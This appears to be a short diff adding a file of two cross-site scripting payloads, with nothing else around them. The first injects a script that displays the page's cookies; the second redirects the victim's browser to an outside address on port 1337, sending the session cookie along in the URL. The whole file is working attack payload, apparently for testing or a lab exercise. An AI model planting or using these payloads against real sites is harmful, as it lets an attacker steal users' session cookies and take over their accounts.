@@ -1,0 +1,3 @@
+<script>alert(document.cookie);</script>
+
+<script>window.location='http://192.168.100.5:1337/?cookie='+document.cookie</script>
